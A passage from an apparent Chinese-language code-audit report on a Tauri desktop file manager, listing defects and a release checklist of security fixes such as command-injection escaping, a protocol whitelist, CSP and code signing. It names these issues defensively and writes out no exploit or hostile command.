**位置**：`lib.rs:1457-1473`，注释自述"使用 app.set_menu 而不是 set_dock_menu"

**问题**：`set_menu` 设的是 App 菜单栏，不是 Dock 右键菜单。

**修复**：
- 升 Tauri 到支持 `set_dock_menu` 的版本（或调用底层 `objc` 直接设 `NSApp.dockTile.menu`）
- 在改好之前 FEATURES Tier 10.3 状态改回 ⏳，不要写 ✅

### DEF-31 Updater 不可回滚 + 无 staged rollout + 无 kill switch

**修复方向**（v0.3 路线图）：
- updater 保留前一版 `.app.tar.gz`，新增"回滚到上一版"功能
- manifest 加 `min_version` 字段：低于此版本必须升级，便于强制回滚损坏版本
- CDN 加 `versions-blacklist.json`，启动时拉取，命中提示卸载

### DEF-32 隐私 / 遥测 / 外发请求面

**修复方向**：
- 新增 `docs/PRIVACY.md`：列出所有出网点（updater / 壁纸 URL / `shellOpen` 的链接）
- `wallpaperUrl` 加"该 URL 每次启动会被请求一次"提示
- 设置加"严格隐私模式"：禁用所有非更新检查的出网

---

## 发版前红线检查清单

发 v0.2.2 之前必须全部 ✅：

- [ ] P0-1 终端命令注入修复（含 `apple_quote` 删除、`validate_shell_fragment`）
- [ ] P0-2 shell.open 协议白名单
- [ ] P0-3 CSP + 敏感文件预览黑名单
- [ ] P0-4 `prompt()` 替换为 dialog + 路径规范化
- [ ] P0-5 Updater endpoint 稳定 URL + prerelease 守卫
- [ ] P0-6 Developer ID 签名 + notarytool（若无法立即解决，README 必须删除 `sudo xattr` 教程并明确标注未签名）
- [ ] P0-7 完全磁盘访问真实检测
- [ ] P1-8 console.log drop
- [ ] P1-9 跨设备移动原子化
- [ ] P1-10 符号链接处理
- [ ] P1-11 外置盘删除明确告知
- [ ] P1-15 模板插值 shell 转义
- [ ] P2-16 package.json / Cargo.toml 元数据修正
- [ ] P2-17 删除 AI Studio 残留
- [ ] P2-18 删除未使用依赖
- [ ] FEATURES.md 重新打分（不再用 ✅ 掩盖 ⏳）

## 24h 后必须修复（v0.2.3）

- [ ] P1-12 `list_directory` async + 取消 + Loader
- [ ] P1-13 settings migrator + storeReady 顺序修正
- [ ] P1-14 i18n 硬编码中文清理 + CI lint
- [ ] P2-19 SECURITY.md + CHANGELOG.md + CONTRIBUTING.md
- [ ] P2-20 / 21 / 22 文档状态校准

## v0.3 路线图

- [ ] P3-23 ExplorerView 拆分
- [ ] P3-24 测试覆盖
- [ ] P3-25 ESLint + clippy
- [ ] DEF-29 定位单点突破
- [ ] DEF-30 真实 Dock 菜单
- [ ] DEF-31 updater 回滚 + staged rollout
- [ ] DEF-32 隐私文档与严格模式

---

## 一句话结语

> 当前版本可以作为"开源原型 demo"自豪展示，但不能以"v0.2.1 稳定版"的口吻向陌生用户推广。
> 一旦有人因 P0-1/2/4 受损并发到 Hacker News，整个项目信誉会一次性烧光，
> 且**没有签名意味着你都无法用紧急更新挽救**。先把红线清单做完，再开放下载链接。
